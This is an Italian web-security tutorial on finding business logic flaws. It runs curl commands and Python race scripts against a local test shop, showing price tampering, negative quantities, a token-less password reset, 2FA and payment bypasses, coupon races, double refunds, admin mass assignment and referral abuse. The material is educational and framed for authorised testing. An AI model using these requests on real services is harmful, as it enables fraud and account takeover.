---
title: 'Business Logic Flaw: Cos’è e Come Trovarlo nel Pentest Web'
slug: business-logic-flaw
description: 'Cos’è un business logic flaw (o business logic vulnerability) e come trovarlo: test su workflow, coupon e race condition, con esempi, comandi curl e Burp.'
image: /business-logic-flaw.webp
draft: false
date: 2026-03-13T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - Business Logic Vulnerability
  - Coupon Manipulation
  - Price Manipulation
  - Workflow Bypass
  - Business Logic Testing
---

# Business Logic Flaw: come trovare e testare le vulnerabilità

Un **Business Logic Flaw** (in inglese anche *logic flaw* o *logical flaw*) è un difetto nelle regole di un'applicazione, non nel modo in cui il codice è scritto. Non c'è SQL injection, non c'è XSS, non c'è buffer overflow: il codice fa esattamente quello che lo sviluppatore ha programmato. Il problema è che nessuno ha previsto cosa succede quando l'utente fa la cosa giusta nel modo sbagliato: quantità negativa, passaggio saltato, coupon riusato venti volte nello stesso istante.

Un esempio da manuale: un e-commerce accetta una quantità `-3` nel carrello. Il codice calcola `prezzo × quantità`, il totale diventa negativo e al checkout il sistema **accredita** soldi invece di addebitarli. Nessun bug tecnico: la moltiplicazione è corretta. Mancava una regola.

Satellite della [guida pillar Misc & Infra Attacks](https://hackita.it/articoli/misc-infra-attacks-guida-completa/). Vedi anche: [Race Condition](https://hackita.it/articoli/race-condition/) e [IDOR](https://hackita.it/articoli/idor/).

In questa guida trovi il metodo di business logic testing, i comandi reali con gli output ottenuti su un'app di test locale (un negozio online con carrello, coupon, rimborsi e piani). Tutto è pensato per ambienti autorizzati: lab locali, Hack The Box, Web Security Academy, programmi bug bounty dentro lo scope.

## Cos'è una Business Logic Vulnerability

Un Business Logic Flaw, o vulnerabilità della logica applicativa, è un difetto nella progettazione o nell'implementazione delle regole e dei flussi di una web application: prezzi, sconti, limiti, ruoli, sequenze di passaggi. Permette di eseguire operazioni non previste, come riutilizzare un coupon o saltare il pagamento, usando richieste HTTP valide. Per questo sfugge agli scanner e richiede test manuali.

Nel gergo dei pentester li trovi chiamati anche *logic flaw*, *logical flaws* o semplicemente *flawed logic*: l'idea è sempre la stessa, regole di business pensate o applicate male. A differenza di SQL injection o XSS, qui non c'è un payload da riconoscere: ogni singola richiesta è legittima, è la **combinazione** (ordine, ripetizione, valore, tempismo) a violare la regola di business. Per i test di sicurezza questo cambia tutto: serve prima capire come dovrebbe funzionare il business, poi provare a romperlo.

### Perché nascono

I logical flaws non dipendono dal linguaggio o dal framework: la stessa flawed logic si ritrova in PHP, Java, Node e Python, perché nasce nelle regole e non nel codice.

Quasi sempre da **assunzioni sbagliate sul comportamento dell'utente**. Chi progetta pensa al percorso felice (carrello, coupon, pagamento) e non a chi:

* salta un passaggio e va direttamente all'ultimo
* ripete lo stesso passaggio più volte
* cambia un valore dopo che è stato validato
* manda due richieste nello stesso istante
* manda un numero negativo, enorme o decimale dove si aspetta un intero normale

Altre cause frequenti: validazione solo nel browser, processi modellati in modo incompleto, componenti che interpretano lo stesso dato in modo diverso, requisiti ambigui ("il coupon vale una volta": per utente? per ordine? per sempre?).

### Differenza con le altre vulnerabilità web

| Vulnerabilità               | Dove sta il problema                      | Cosa invii                    |
| --------------------------- | ----------------------------------------- | ----------------------------- |
| SQL Injection, XSS          | Input non filtrato                        | Payload malevolo              |
| IDOR, Broken Access Control | Controllo di autorizzazione mancante      | Un ID che non è tuo           |
| Race Condition              | Timing: controllo e scrittura non atomici | Richieste parallele           |
| **Business Logic Flaw**     | Regola di business mancante o aggirabile  | Richieste valide, ma inattese |

I confini si sovrappongono. La Race Condition sfrutta il **timing**, il Business Logic Flaw sfrutta la **logica**; spesso coesistono (un coupon monouso può cedere sia alla gara tra richieste, sia a una differenza maiuscole/minuscole). La CWE-840 di MITRE è una categoria che raggruppa queste debolezze: serve a orientarsi, non a etichettare una singola CVE.

## Business Logic Flaw: tipologie

I logical flaws si raggruppano in poche famiglie ricorrenti, e conoscerle accorcia molto la ricerca:

| Famiglia                           | Esempio                                                | Sezione            |
| ---------------------------------- | ------------------------------------------------------ | ------------------ |
| Fiducia nel client                 | Prezzo o sconto deciso dal browser                     | Prezzo e quantità  |
| Input non convenzionale            | Negativi, zero, enormi, tipi sbagliati                 | Input ai limiti    |
| Parametri omessi                   | Token di reset assente → controllo saltato             | Parametri mancanti |
| Sequenza violata (workflow bypass) | Conferma ordine senza pagamento, 2FA saltato           | Workflow           |
| Coupon e sconti                    | Stacking, soglia aggirabile, maiuscole/minuscole       | Coupon             |
| Race condition                     | Limite "una volta" superato in parallelo               | Race               |
| Valute e rimborsi                  | Tassi diversi tra acquisto e rimborso, doppio rimborso | Valute e rimborsi  |
| Piani e ruoli                      | Upgrade gratis, rimborso che tiene l'accesso           | Piani              |
| Referral e bonus                   | Self-referral con email usa e getta                    | Referral           |
| Arrotondamenti e overflow          | Debito troncato, accredito arrotondato                 | Arrotondamenti     |
| Primitive crittografiche           | Encryption oracle                                      | Oracoli            |
| Parser incoerenti                  | Email letta in modo diverso da due componenti          | Parser             |

## L'app di prova usata negli esempi

Gli esempi che seguono sono stati eseguiti su un negozio online di prova, costruito apposta e girato solo in locale. Ha questi endpoint: `/login`, `/2fa`, `/account`, `/api/cart/add`, `/api/coupon/apply`, `/api/checkout`, `/api/order/create`, `/api/order/confirm`, `/api/orders/<id>/refund`, `/api/transfer`, `/api/register`, `/api/plan/buy`, `/api/premium/report`, `/api/reviews`. Utenti `alice`, `bob`, `carol` e `dave`; prodotti `7` (Keyboard a 50) e `99` (Laptop a 999); coupon `WELCOME10` (10%) e `BIG10` (10%, solo sopra 1000).

Non è un'applicazione da scaricare: serve a mostrare cosa vedi nelle risposte. Per allenarti davvero usa i laboratori sulla logica applicativa di [PortSwigger Web Security Academy](https://portswigger.net/web-security/logic-flaws) o un tuo ambiente autorizzato, adattando indirizzo, endpoint e formato dei dati.

I comandi usano due variabili di shell e un file cookie per utente:

```bash
# Base address of the test app and the JSON header used by every command below
export B=http://127.0.0.1:5000
export J='Content-Type: application/json'

# Log in and keep the session cookies in alice.txt and bob.txt
curl -s -c alice.txt -X POST $B/login -d 'user=alice&pass=alice123'
curl -s -c bob.txt -X POST $B/login -d 'user=bob&pass=bob123'
```

```json
{"status":"password ok, 2fa code required"}
{"status":"password ok, 2fa code required"}
```

I saldi negli output dipendono dai test già eseguiti. Per questa classe di vulnerabilità `curl` basta quasi sempre; [Burp Suite](https://hackita.it/articoli/burp-suite/) serve quando devi iterare, mandare richieste in parallelo o modificare il traffico di un browser.

## Come trovare e testare i Business Logic Flaw

Per il **business logic testing** conta più il metodo degli strumenti. Checklist sintetica prima di partire:

* Hai mappato il flusso business completo (registrazione, acquisto, pagamento, rimborso, referral, piani)?
* Per ogni passaggio hai provato a saltarlo, ripeterlo, invertire l'ordine?
* Per ogni valore numerico hai provato 0, negativi, enormi, decimali, tipi sbagliati?
* Per ogni limite ("una volta", "massimo 3") hai provato richieste parallele e account multipli?
* Hai confrontato quello che mostra il frontend, quello che viaggia nella richiesta e quello che salva il backend?
* Dopo ogni test hai controllato **lo stato** (saldo, ordine, ruolo), non solo il codice HTTP?

![Business Logic Flaw: ciclo di test dalla mappa del flusso alla catena di impatto]()

Il trucco mentale è uno: **cerca i "NO"**. Individua le cose che l'applicazione dice di non permettere e prova a farle lo stesso.

1. **Mappa il flusso**: percorri l'app da utente normale con il proxy in ascolto e annota ogni passaggio che tocca soldi, permessi, stati o limiti.
2. **Scrivi le regole**: "il prezzo lo decide il server", "il coupon vale una volta", "senza pagamento niente conferma", "il 2FA è obbligatorio".
3. **Rompi una regola alla volta**: ripeti, salta, inverti, rimuovi, esagera.
4. **Osserva lo stato**: un `200 OK` non dimostra nulla. Dopo ogni test leggi saldo, carrello, ordini, ruolo.
5. **Concatena**: due difetti piccoli (sconto riutilizzabile + rimborso a tasso diverso) diventano un impatto serio.

### Input ai limiti

Per ogni campo numerico:

| Campo                       | Valori da provare                                             |
| --------------------------- | ------------------------------------------------------------- |
| Quantità                    | `0`, `-1`, `-1000`, `0.5`, `0.001`, `999999999`, `2147483647` |
| Prezzo                      | `0`, `0.01`, `-100`, `99999999`                               |
| Importo di un trasferimento | `0`, `-500`, saldo + 1, saldo × 2                             |
| Tipo del dato               | stringa (`"10"`), `null`, `[]`, `true`                        |
| Codice coupon               | vuoto, già usato, scaduto, maiuscolo/minuscolo, con spazi     |

Tieni separati tre tipi di prova: **numeri validi ai limiti** (`-1`, `2147483647`), **conversioni di tipo** (`"10"` al posto di `10`, `true`) e **precisione dei calcoli** (importi frazionari). Un'espressione come `0.1+0.2` non è un numero JSON valido: ha senso solo se un componente la interpreta come formula.

### Test di workflow non lineari

Se il flusso previsto è `Step1 → Step2 → Step3 → Step4`, prova:

| Percorso                                | Cosa verifica                                         |
| --------------------------------------- | ----------------------------------------------------- |
| `Step1 → Step4`                         | Si può saltare tutto il mezzo?                        |
| `Step1 → Step2 → Step1 → Step3 → Step4` | Ripetere un passaggio cambia il risultato?            |
| `Step4` direttamente                    | L'ultimo step controlla davvero gli stati precedenti? |
| `Step1 → Step3 → Step2 → Step4`         | L'ordine è imposto dal server?                        |

## Business Logic Testing con Burp Suite

Strumenti e uso tipico:

| Strumento                                     | A cosa serve                                                       |
| --------------------------------------------- | ------------------------------------------------------------------ |
| Proxy e HTTP history                          | Mappare il flusso e vedere cosa viaggia davvero                    |
| Repeater                                      | Rigiocare una richiesta cambiando un valore alla volta             |
| Repeater con gruppo di richieste in parallelo | Race condition e limiti aggirabili                                 |
| Intruder / Turbo Intruder                     | Ripetizioni e gare su molte richieste                              |
| Match and Replace                             | Cambiare valori nelle risposte per vedere cosa cambia nel frontend |
| `curl` + `xargs -P`                           | Richieste parallele senza installare nulla                         |
| Python + `requests` + `threading`             | Gare sincronizzate con barriera                                    |
| DevTools del browser                          | Campi nascosti, `localStorage`, logica JavaScript                  |

Una nota onesta sugli scanner: quelli generici possono non individuare molti Business Logic Flaw perché non conoscono le regole e gli invarianti del processo applicativo. Alcune anomalie di workflow possono emergere da controlli automatizzati, ma il test manuale resta fondamentale per capire il comportamento atteso, verificare le transizioni di stato e dimostrare l'impatto reale della violazione.

## Business Logic Vulnerability: esempi pratici

### 1. Prezzo e quantità: fiducia nel client

Il browser calcola il prezzo, il server si fida. Se il prezzo è nella richiesta, lo decidi tu:

```bash
# The price is taken from the request body: send our own
curl -s -b alice.txt -X POST $B/api/cart/add -H "$J" \
  -d '{"product_id": 7, "qty": 1, "price": 0.01}'

curl -s -b alice.txt -X POST $B/api/checkout -H "$J" -d '{}'
```

```json
{"discount_pct":0,"items":{"7":{"price":0.01,"qty":1}},"subtotal":0.01,"total":0.01}
{"order_id":1001,"status":"success","total":0.01,"wallet_balance":99.99}
```

Una tastiera da 50 euro pagata 1 centesimo. Nella versione corretta il prezzo nella richiesta viene ignorato: il subtotale resta `50.0`. Stessa famiglia: campi `hidden` nei form, limiti scritti solo in JavaScript (`max`, `maxlength`, `disabled`), pulsanti "nascosti" per le funzioni premium. **Tutto ciò che il client può modificare, il client lo modifica.**

### 2. Quantità negative e importi negativi

Il caso classico del totale negativo:

```bash
# A negative quantity makes the cart total negative
curl -s -b alice.txt -X POST $B/api/cart/add -H "$J" \
  -d '{"product_id": 99, "qty": -3}'

# Checkout: the "balance >= total" check passes with a negative total
curl -s -b alice.txt -X POST $B/api/checkout -H "$J" -d '{}'
```

```json
{"discount_pct":0,"items":{"99":{"price":999.0,"qty":-3}},"subtotal":-2997.0,"total":-2997.0}
{"order_id":1002,"status":"success","total":-2997.0,"wallet_balance":3096.99}
```

Il portafoglio è passato da 99,99 a 3096,99: 2997 euro accreditati da una quantità negativa. Stesso schema nei trasferimenti di denaro, dove il controllo guarda solo il limite superiore:

```python
# Vulnerable: only the upper bound is checked
def transfer(balances, src, dst, amount):
    if amount <= balances[src]:
        balances[src] -= amount
        balances[dst] += amount
        return True
    return False

b = {"attacker": 50, "victim": 5000}
print(transfer(b, "attacker", "victim", -1000), b)
# True {'attacker': 1050, 'victim': 4000}
```

```bash
# A negative amount reverses the direction of the transfer
curl -s -b alice.txt -X POST $B/api/transfer -H "$J" \
  -d '{"to": "bob", "amount": -1000}'
```

```json
{"status":"sent","wallet_balance":4096.99}
```

Il saldo di alice sale di 1000 e quello di bob scende di 1000. Con le regole applicate le due richieste vengono rifiutate (`quantity out of range` e `bad amount`).

### 3. Parametri obbligatori omessi

Gli sviluppatori danno per scontato che un campo previsto dal form arrivi sempre. Ritaglia la richiesta un pezzo alla volta: togli un parametro per volta da URL, body e cookie; togli il **nome** e, in un altro test, solo il **valore**; ripeti su ogni step di un flusso a più passaggi.

Nell'app di prova, il reset password salta il controllo se il campo `token` manca del tutto:

```bash
# With a wrong token the server refuses
curl -s -X POST $B/api/password/reset -H "$J" \
  -d '{"user": "carol", "token": "wrong", "new_password": "x"}'

# Same request without the token field at all
curl -s -X POST $B/api/password/reset -H "$J" \
  -d '{"user": "carol", "new_password": "pwned"}'
```

```json
{"error":"invalid token"}
{"status":"password changed","user":"carol"}
```

Una password cambiata senza alcun token: il controllo esisteva, ma scattava solo se il campo era presente. Per le catene che partono da qui vedi [account takeover](https://hackita.it/articoli/account-takeover/).

### 4. Sequenza violata e workflow bypass

Il flusso previsto è creare l'ordine, pagare, confermare. Il server controlla davvero che il pagamento sia avvenuto prima della conferma?

![Workflow bypass: conferma ordine senza passare dal pagamento]()

```bash
# Put a keyboard in the cart, then create an order: it starts as "pending"
curl -s -b alice.txt -X POST $B/api/cart/add -H "$J" -d '{"product_id": 7, "qty": 1}' >/dev/null
OID=$(curl -s -b alice.txt -X POST $B/api/order/create -H "$J" -d '{}' | sed 's/.*"order_id":\([0-9]*\).*/\1/')
echo "pending order: $OID"

# Skip the payment step and confirm directly
curl -s -b alice.txt -X POST $B/api/order/confirm -H "$J" -d "{\"order_id\": $OID}"
```

```json
pending order: 1003
{"shipping":"in_progress","status":"confirmed"}
```

Ordine confermato e in spedizione senza pagamento. Con la regola applicata la stessa richiesta viene rifiutata con `payment required`.

Il caso più noto di sequenza violata è il **2FA aggirabile**. Un `200 OK` da solo non prova nulla: una pagina di login risponde `200` pure lei. La prova è l'accesso a una **risorsa protetta**:

```bash
# Step 1: password login. The 2FA code is never sent.
curl -s -c alice.txt -X POST $B/login -d 'user=alice&pass=alice123'

# Step 2: ask for protected data directly and check the content, not only the status
curl -s -b alice.txt -w ' -> HTTP %{http_code}\n' $B/account
```

```json
{"status":"password ok, 2fa code required"}
{"user":"alice","wallet":4096.99}
 -> HTTP 200
```

I dati del portafoglio sono arrivati senza il secondo fattore: questo dimostra il bypass. Con la regola applicata la risposta è `2fa required` con `HTTP 403`.

### 5. Coupon e sconti

Il modulo coupon è una miniera. Checklist: riuso, stacking, differenza maiuscole/minuscole, soglia aggirabile, coupon su prodotti già scontati, coupon dopo il pagamento, scadenza controllata con un timestamp inviato dal client.

**Soglia aggirabile.** Lo sconto del 10% vale solo sopra 1000 euro, ma la regola è controllata una sola volta, al momento di applicare il codice:

![Race condition: controllo e scrittura non atomici sul coupon]()

```bash
# 1998 total, above the 1000 threshold
curl -s -b alice.txt -X POST $B/api/cart/add -H "$J" -d '{"product_id": 99, "qty": 2}'

# Apply the coupon while the cart is large enough
curl -s -b alice.txt -X POST $B/api/coupon/apply -d 'code=BIG10'

# Remove one laptop: the cart drops to 999 but keeps the discount
curl -s -b alice.txt -X POST $B/api/cart/add -H "$J" -d '{"product_id": 99, "qty": -1}'

# Pay: the 10% discount is still applied
curl -s -b alice.txt -X POST $B/api/checkout -H "$J" -d '{}'
```

```json
{"discount_pct":0,"items":{"99":{"price":999.0,"qty":2}},"subtotal":1998.0,"total":1998.0}
{"coupons":["BIG10"],"discount_pct":10,"status":"applied","subtotal":1998.0,"total":1798.2}
{"discount_pct":10,"items":{"99":{"price":999.0,"qty":1}},"subtotal":999.0,"total":899.1}
{"order_id":1004,"status":"success","total":899.1,"wallet_balance":3197.89}
```

Un carrello da 999 euro paga 899,10: lo sconto "sopra 1000" è rimasto.

**Maiuscole e minuscole.** Il controllo "già usato" è case sensitive, la ricerca del coupon no:

```bash
curl -s -b alice.txt -X POST $B/api/cart/add -H "$J" -d '{"product_id": 7, "qty": 1}' >/dev/null
curl -s -b alice.txt -X POST $B/api/coupon/apply -d 'code=WELCOME10'
curl -s -b alice.txt -X POST $B/api/coupon/apply -d 'code=welcome10'
curl -s -b alice.txt -X POST $B/api/checkout -H "$J" -d '{}'
```

```json
{"coupons":["WELCOME10"],"discount_pct":10,"status":"applied","subtotal":50.0,"total":45.0}
{"coupons":["WELCOME10","WELCOME10"],"discount_pct":20,"status":"applied","subtotal":50.0,"total":40.0}
{"order_id":1005,"status":"success","total":40.0,"wallet_balance":3157.89}
```

Lo stesso coupon, applicato due volte con case diverso. Altri pattern da provare: **gift card + coupon in loop** (compri una gift card da 100 con coupon 20%, paghi 80, riscatti 100, ripeti), **coupon su prezzo già scontato** (sconto totale del 60% invece del 50%) e **timestamp inviato dal client** per verificare la scadenza.

Se il campo codice accetta caratteri speciali, controlla anche la query dietro: a volte oltre alla logica c'è una [SQL Injection](https://hackita.it/articoli/sql-injection/).

### 6. Race condition sui limiti

"Un coupon per utente" è una regola che si rompe se mandi molte richieste nello stesso istante: il server controlla "non ancora usato" per tutte prima che la prima segni "usato". Approfondimento nell'articolo sulle [race condition](https://hackita.it/articoli/race-condition/).

![Trucco della soglia sconto: la regola è controllata una sola volta]()

Il test minimo con strumenti nativi:

```bash
# Put a keyboard in bob's cart, then fire 20 identical coupon requests in parallel
curl -s -b bob.txt -X POST $B/api/cart/add -H "$J" -d '{"product_id": 7, "qty": 1}' >/dev/null
seq 1 20 | xargs -P 20 -I{} curl -s -b bob.txt -X POST $B/api/coupon/apply -d 'code=WELCOME10'
```

E la versione Python, che sincronizza meglio le richieste. Fa prima il login e poi riusa il cookie reale in ogni thread:

```python
import threading

import requests

B = "http://127.0.0.1:5000"
N = 20

# Log in once, then reuse the same session cookie in every thread
s = requests.Session()
s.post(f"{B}/login", data={"user": "dave", "pass": "dave123"})
s.post(f"{B}/api/cart/add", json={"product_id": 7, "qty": 1})
cookies = s.cookies.get_dict()

barrier = threading.Barrier(N)  # all threads wait here, then fire together
codes = []


def fire():
    barrier.wait()
    r = requests.post(f"{B}/api/coupon/apply", data={"code": "WELCOME10"}, cookies=cookies)
    codes.append(r.status_code)


threads = [threading.Thread(target=fire) for _ in range(N)]
for t in threads:
    t.start()
for t in threads:
    t.join()

print({c: codes.count(c) for c in sorted(set(codes))})
cart = requests.post(f"{B}/api/cart/add", json={"product_id": 7, "qty": 1}, cookies=cookies).json()
print("discount_pct:", cart["discount_pct"], "total:", cart["total"])
```

```text
{200: 20}
discount_pct: 200 total: -100.0
```

Tutte e 20 le richieste hanno applicato il coupon: sconto del 200%, totale negativo (lo script aggiunge un secondo prodotto, quindi il carrello vale 100). Il numero esatto cambia da un'esecuzione all'altra, ma se il controllo non è atomico più di una richiesta passa. Con il controllo atomico passa una sola richiesta e le altre ricevono `409`. In Burp, la modalità più affidabile è il gruppo di richieste in parallelo del Repeater, oppure Turbo Intruder. Vale per qualunque azione con un limite: prelievi, like, voti, commenti, inviti.

### 7. Valute e rimborsi

**Currency arbitrage.** Il negozio accetta pagamenti in USD (1 EUR = 1,10 USD all'acquisto) ma calcola il rimborso con un tasso 1:1. Paghi in dollari, chiedi il rimborso e la differenza resta a te:

```bash
# Pay a 50 EUR order in USD: the shop charges 55 USD
curl -s -b alice.txt -X POST $B/api/cart/add -H "$J" -d '{"product_id": 7, "qty": 1}' >/dev/null
R=$(curl -s -b alice.txt -X POST $B/api/checkout -H "$J" -d '{"currency": "USD"}')
echo "$R"
OID=$(echo "$R" | sed 's/.*"order_id":\([0-9]*\).*/\1/')

# Refund the order: the 55 USD charged are credited back as 55 EUR
curl -s -b alice.txt -X POST $B/api/orders/$OID/refund
```

```json
{"order_id":1006,"status":"success","total":50.0,"wallet_balance":3107.89}
{"refunded":55.0,"status":"refunded","wallet_balance":3162.89}
```

Pagati 50 euro, rimborsati 55: 5 euro di profitto per giro. Il test completo richiede l'intero flusso (pagamento in una valuta, rimborso, confronto del saldo): controlla se il tasso è lo stesso all'acquisto e al rimborso e se la valuta si può cambiare in mezzo.

**Doppio rimborso.** Il server controlla che l'ordine sia già stato rimborsato?

```bash
# Pay a 50 EUR order, then ask for the refund twice
curl -s -b alice.txt -X POST $B/api/cart/add -H "$J" -d '{"product_id": 7, "qty": 1}' >/dev/null
OID=$(curl -s -b alice.txt -X POST $B/api/checkout -H "$J" -d '{}' | sed 's/.*"order_id":\([0-9]*\).*/\1/')
curl -s -b alice.txt -X POST $B/api/orders/$OID/refund
curl -s -b alice.txt -X POST $B/api/orders/$OID/refund
```

```json
{"refunded":50.0,"status":"refunded","wallet_balance":3162.89}
{"refunded":50.0,"status":"refunded","wallet_balance":3212.89}
```

Lo stesso ordine rimborsato due volte. Con le regole applicate la seconda richiesta è rifiutata (`not refundable`) e il rimborso in USD restituisce esattamente i 50 euro originali.

Da provare anche: **delivery fee** negativa o modificabile, **modifica dell'ordine dopo il pagamento** (cambiare il prodotto da 10 a 1000 euro) e **annullamento parziale** con prezzo di volume sbagliato.

### 8. Piani premium, ruoli e rimborsi

Un flag `premium` restituito al frontend non dimostra, da solo, che il backend applichi i controlli. Con Burp Suite puoi modificare la risposta (**Proxy → Match and Replace**, `"premium":false` → `"premium":true`) e vedere se l'interfaccia mostra funzioni nascoste, ma questa prova riguarda soltanto il client. Per confermare una vulnerabilità serve verificare se **l'API protetta** risponde senza i privilegi:

```bash
# What the frontend reads
curl -s -b alice.txt $B/api/me

# What the server enforces: a free user is refused, whatever the UI shows
curl -s -b alice.txt -w ' -> HTTP %{http_code}\n' $B/api/premium/report
```

```json
{"plan":"free","premium":false,"role":"user","user":"alice"}
{"error":"premium only"}
 -> HTTP 403
```

Se il valore sta in un cookie o in un token, verifica anche come è protetto: modificare un claim di un [JWT](https://hackita.it/articoli/jwt/) firmato, per esempio, normalmente invalida la firma. Il difetto vero è un altro: un endpoint che accetta il piano dal client.

```bash
# Upgrade without paying: the endpoint trusts the "plan" field
curl -s -b alice.txt -X PUT $B/api/account/plan -H "$J" -d '{"plan": "enterprise"}'
curl -s -b alice.txt $B/api/premium/report
```

```json
{"plan":"enterprise","status":"plan changed"}
{"report":"quarterly numbers"}
```

**Mass assignment sul ruolo.** Se l'API aggiorna qualunque campo ricevuto, puoi scriverti un ruolo da amministratore:

```bash
curl -s -b alice.txt -X PUT $B/api/users/me -H "$J" -d '{"name": "Alice", "role": "admin"}'
curl -s -b alice.txt $B/api/me
```

```json
{"status":"updated"}
{"plan":"enterprise","premium":true,"role":"admin","user":"alice"}
```

**Rimborso che mantiene l'accesso.** Compri il premium (20 euro), chiedi il rimborso, e controlli se le funzioni restano aperte:

```bash
curl -s -b bob.txt -X POST $B/api/plan/buy
curl -s -b bob.txt -X POST $B/api/plan/refund
curl -s -b bob.txt -w ' -> HTTP %{http_code}\n' $B/api/premium/report
```

```json
{"status":"premium active","wallet_balance":3980.0}
{"status":"refunded","wallet_balance":4000.0}
{"report":"quarterly numbers"}
 -> HTTP 200
```

Soldi restituiti e servizio ancora attivo. Altri test: trial premium con downgrade a free (le funzioni restano?), limiti del piano free aggirati con più account. Per l'escalation via API vedi anche [privilege escalation web](https://hackita.it/articoli/privilege-escalation-web/).

### 9. Referral e bonus

"Invita un amico e ricevi 5 euro". Cosa impedisce di invitare te stesso con email usa e getta?

```bash
# Alice's balance before
curl -s -b alice.txt $B/account

# Five fake registrations with the same referral code
for i in 1 2 3 4 5; do
  curl -s -X POST $B/api/register -H "$J" \
    -d "{\"email\": \"fake$i@tempmail.com\", \"password\": \"Test123!\", \"referral\": \"ALICE5\"}"
  echo
done

# Alice's balance after
curl -s -b alice.txt $B/account
```

```json
{"user":"alice","wallet":3212.89}
{"email":"fake1@tempmail.com","status":"registered"}
...
{"user":"alice","wallet":3237.89}
```

Il saldo di alice sale di 25 euro (5 per ogni account falso). Nella versione corretta le email usa e getta vengono rifiutate (`{"error":"disposable email"}`) e il bonus ha un tetto. Domande da fare a ogni programma referral: l'email va verificata? Serve una transazione minima dell'invitato? Stesso IP o dispositivo possono creare più account? C'è un limite di bonus per utente?

### 10. Carrello, recensioni e funzioni "minori"

Sono le meno controllate. Quantità fuori stock, oggetti spostati nel carrello di un altro utente cambiando un ID (qui entra in gioco l'[IDOR](https://hackita.it/articoli/idor/)), recensioni senza acquisto, impersonare un altro autore, upload negli allegati ([file upload attack](https://hackita.it/articoli/file-upload-attack/)) e CSRF sui form ([CSRF](https://hackita.it/articoli/csrf/)).

```bash
# Rating outside the allowed 1-5 range
curl -s -b alice.txt -X POST $B/api/reviews -H "$J" \
  -d '{"product_id": 7, "rating": 99, "text": "great"}'
```

```json
{"average_rating":99.0,"status":"stored"}
```

Un solo voto da 99 sposta la media del prodotto a 99. Con la validazione corretta la risposta è `rating must be 1-5`.

### 11. Arrotondamenti e integer overflow

Quando due parti del codice arrotondano in modo diverso, il denaro si crea dal nulla. Un caso pubblico è la segnalazione HackerOne #176461 su una piattaforma crypto: trasferendo 0,5 satoshi, il destinatario riceveva 1 satoshi e al mittente non veniva tolto nulla. È il cosiddetto **salami attack**: differenze minuscole, ripetute molte volte. Il difetto in forma di codice:

```python
from decimal import Decimal, ROUND_HALF_UP

# Vulnerable transfer: debit and credit are rounded in different ways
def transfer(balances, sender, receiver, amount):
    debit = int(amount)  # 0.5 -> 0 (truncation)
    credit = int(amount.quantize(Decimal("1"), rounding=ROUND_HALF_UP))  # 0.5 -> 1
    if balances[sender] < debit:
        raise ValueError("insufficient funds")
    balances[sender] -= debit
    balances[receiver] += credit

balances = {"attacker": 10, "mule": 0}
for _ in range(1000):
    transfer(balances, "attacker", "mule", Decimal("0.5"))

print(balances)
# {'attacker': 10, 'mule': 1000}
```

Mille trasferimenti da 0,5: il conto di destinazione ha 1000 unità create dal nulla, il mittente non ha perso niente. Cerca importi frazionari, conversioni di valuta, commissioni, punti fedeltà, interessi.

Per l'**integer overflow**, se il backend calcola il totale con un intero a 32 bit, una quantità enorme fa girare il contatore:

```python
import ctypes

# 999 * 2147483647 does not fit in a signed 32-bit integer
print(999 * 2147483647)                         # 2145336163353
print(ctypes.c_int32(999 * 2147483647).value)   # 2147482649
```

Con un tipo a 32 bit il risultato "gira" e può diventare negativo o inatteso a seconda dei valori. Python non soffre di questo problema, ma Java, C, C# e alcuni database sì: l'app di prova non lo riproduce: serve un backend con interi a larghezza fissa.

### 12. Oracoli di cifratura

Se l'app cifra un valore che controlli tu e te lo restituisce (per esempio un cookie "ricordami" costruito dal tuo nome), hai un **encryption oracle**: puoi farle cifrare ciò che vuoi con la sua chiave. Porta poi quel testo cifrato in un altro punto dell'app che si aspetta lo stesso formato, per esempio una sessione o un token di conferma. Se esiste anche un punto che decifra e mostra gli errori, capisci come è fatto il contenuto atteso e costruisci il token giusto. Non serve rompere la crittografia: l'applicazione ti offre il servizio di cifratura.

### 13. Parser di email incoerenti

Quando due componenti leggono lo stesso indirizzo in modo diverso, puoi registrare un account che sembra di un dominio esterno ma viene trattato come interno. Se l'app dà privilegi automatici a chi ha una mail aziendale (ruolo admin, accesso a un pannello), diventa privilege escalation. La ricerca di riferimento è "Splitting the Email Atom" di PortSwigger: codifiche e caratteri speciali nell'indirizzo vengono interpretati diversamente tra validazione, invio e verifica del dominio. Test pratico: registrati con indirizzi che usano codifiche e caratteri speciali nella parte locale e osserva a quale dominio l'app associa il tuo account.

## Dove cercare nelle web app reali

I logic flaw si concentrano dove il codice incontra denaro, permessi e stati. Ecco dove guardare per primi:

| Area                        | Cosa cercare                                                                                           |
| --------------------------- | ------------------------------------------------------------------------------------------------------ |
| Checkout e pagamenti        | Prezzo nel client, sconti, valute, importi negativi, step saltabili                                    |
| Coupon, referral, bonus     | Riuso, stacking, case sensitivity, race condition                                                      |
| Registrazione, login, reset | Parser email, 2FA saltabile, token omesso                                                              |
| Carrello e ordini           | Quantità, sequenza degli step, IDOR                                                                    |
| Piani e abbonamenti         | Upgrade gratis, rimborso che tiene l'accesso, downgrade                                                |
| API                         | Parametri nascosti, versioni vecchie, [rate limit](https://hackita.it/articoli/api-rate-limit-bypass/) |
| Inviti e ruoli              | Auto-assegnazione ruolo, mass assignment                                                               |

Le API sono spesso più permissive della UI: se l'interfaccia impedisce un'azione, mandala direttamente all'endpoint. Per i flussi multi-step con molte occasioni di salto vedi anche [OAuth](https://hackita.it/articoli/oauth-attack/) e [GraphQL](https://hackita.it/articoli/graphql-exploitation/), e per il quadro generale gli [attacchi alle applicazioni web](https://hackita.it/articoli/attacchi-applicazioni-web/).

## Business Logic Flaw nel bug bounty

I business logic flaws, e i logical flaws in generale, sono tra le segnalazioni più apprezzate perché mostrano un impatto di business reale, e sono anche quelle che gli scanner dei concorrenti non trovano. Regole pratiche:

* Rispetta lo scope e le regole del programma, e non muovere denaro reale né danneggiare altri utenti: dimostra l'impatto sul **tuo** account di test.
* Dimostra il difetto con **stato prima e dopo** (saldo, ordine, ruolo), non con un codice HTTP.
* Calcola l'impatto concreto: "un attaccante può generare X euro di bonus" convince più di "il referral non valida l'email".
* Evita di concatenare più difetti nel primo report se uno basta a dimostrare il problema.

Una struttura uniforme per ogni finding:

| Elemento            | Cosa documentare                             |
| ------------------- | -------------------------------------------- |
| Regola attesa       | Cosa dovrebbe impedire l'applicazione        |
| Test eseguito       | Richiesta o modifica inviata                 |
| Risultato osservato | Risposta e stato effettivo sul server        |
| Impatto             | Conseguenza economica o operativa verificata |
| Correzione          | Controllo necessario nel backend             |

